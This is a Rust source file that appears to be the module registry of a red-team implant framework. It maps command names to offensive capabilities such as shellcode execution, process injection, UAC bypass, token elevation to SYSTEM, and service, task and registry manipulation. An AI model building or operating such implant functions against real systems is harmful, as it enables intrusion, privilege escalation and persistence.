#![feature(stmt_expr_attributes)]
#![feature(type_alias_impl_trait)]
#![feature(async_closure)]
pub mod execute;
pub mod fs;
pub mod net;
pub mod prelude;
pub mod sys;

use std::collections::HashMap;

use crate::prelude::*;

#[cfg(not(feature = "disable_register"))]
#[no_mangle]
#[allow(improper_ctypes_definitions)]
pub extern "C" fn register_modules() -> MaleficBundle {
    let mut map: MaleficBundle = HashMap::new();

    #[cfg(debug_assertions)]
    map.insert(
        sys::example::Example::name().to_string(),
        Box::new(sys::example::Example::new()),
    );

    register_module!(map, "pwd", fs::pwd::Pwd);
    register_module!(map, "cd", fs::cd::Cd);
    register_module!(map, "ls", fs::ls::Ls);
    register_module!(map, "rm", fs::rm::Rm);
    register_module!(map, "mv", fs::mv::Mv);
    register_module!(map, "cp", fs::cp::Cp);
    register_module!(map, "mkdir", fs::mkdir::Mkdir);
    register_module!(map, "cat", fs::cat::Cat);

    register_module!(map, "upload", net::upload::Upload);
    register_module!(map, "download", net::download::Download);

    register_module!(map, "exec", execute::exec::Exec);
    register_module!(map, "open", execute::open::Open);
    register_module!(
        map,
        "execute_shellcode",
        execute::execute_shellcode::ExecuteShellcode
    );
    register_module!(map, "kill", sys::kill::Kill);
    register_module!(map, "whoami", sys::whoami::Whoami);
    register_module!(map, "env", sys::env::Env);
    register_module!(map, "env", sys::env::Setenv);
    register_module!(map, "env", sys::env::Unsetenv);
    register_module!(map, "ps", sys::ps::Ps);
    register_module!(map, "netstat", sys::netstat::Netstat);
    register_module!(map, "info", sys::info::SysInfo);

    #[cfg(target_family = "unix")]
    {
        register_module!(map, "chmod", fs::chmod::Chmod);
        register_module!(map, "chown", fs::chown::Chown);
    }

    #[cfg(target_os = "windows")]
    {
        register_module!(map, "wmi", sys::wmi::WmiQuery);
        register_module!(map, "wmi", sys::wmi::WmiExecuteMethod);
        register_module!(map, "service", sys::service::ServiceList);
        register_module!(map, "service", sys::service::ServiceStart);
        register_module!(map, "service", sys::service::ServiceStop);
        register_module!(map, "service", sys::service::ServiceDelete);
        register_module!(map, "service", sys::service::ServiceQuery);
        register_module!(map, "service", sys::service::ServiceCreate);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdList);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdCreate);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdDelete);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdStart);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdStop);
        register_module!(map, "registry", sys::reg::RegQuery);
        register_module!(map, "registry", sys::reg::RegAdd);
        register_module!(map, "registry", sys::reg::RegDelete);
        register_module!(map, "registry", sys::reg::RegListKey);
        register_module!(map, "registry", sys::reg::RegListValue);
        register_module!(map, "bypass", sys::bypass::Bypass);
        register_module!(map, "inject", sys::inject::Inject);
        register_module!(map, "runas", sys::token::RunAs);
        register_module!(map, "privs", sys::token::GetPriv);
        register_module!(map, "getsystem", sys::token::GetSystem);

        // register_module!(map, "pipe", fs::pipe::PipeClose);
        register_module!(map, "pipe", fs::pipe::PipeRead);
        register_module!(map, "pipe", fs::pipe::PipeUpload);

        register_module!(map, "execute_bof", execute::execute_bof::ExecuteBof);
        #[cfg(feature = "execute_powershell")]
        register_module!(
            map,
            "execute_powershell",
            execute::execute_powershell::ExecutePowershell
        );

        #[cfg(feature = "execute_assembly")]
        register_module!(
            map,
            "execute_assembly",
            execute::execute_assembly::ExecuteAssembly
        );

        register_module!(map, "dllspawn", execute::dllspawn::ExecuteDllSpawn);
        register_module!(map, "inline_local", execute::inline_local::InlineLocal);
        register_module!(
            map,
            "execute_armory",
            execute::execute_armory::ExecuteArmory
        );
        register_module!(map, "execute_exe", execute::execute_exe::ExecuteExe);
        register_module!(map, "execute_dll", execute::execute_dll::ExecuteDll);
        register_module!(map, "execute_local", execute::execute_local::ExecuteLocal);
    }
    map
}
